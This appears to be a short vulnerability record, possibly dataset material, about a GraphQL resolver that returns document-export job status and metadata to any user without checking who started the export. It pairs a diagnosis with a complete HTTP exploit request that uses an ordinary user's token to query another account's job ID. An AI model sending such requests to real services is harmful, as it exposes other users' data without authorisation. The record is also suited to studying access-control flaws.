diagnosis: The DocumentExportJob GraphQL resolver exposes the progress and completion status of document export tasks by jobID without verifying the user who triggered the export. Any user can poll the status and metadata of export operations initiated by other accounts.
exploit_request:
POST /graphql HTTP/1.1
Host: exporter.docs-online.com
Authorization: Bearer standard_user_token
Content-Type: application/json

{"query": "query { documentExportJob(jobId: \"job_export_881\") { id status fileFormat progressPercent } }"}
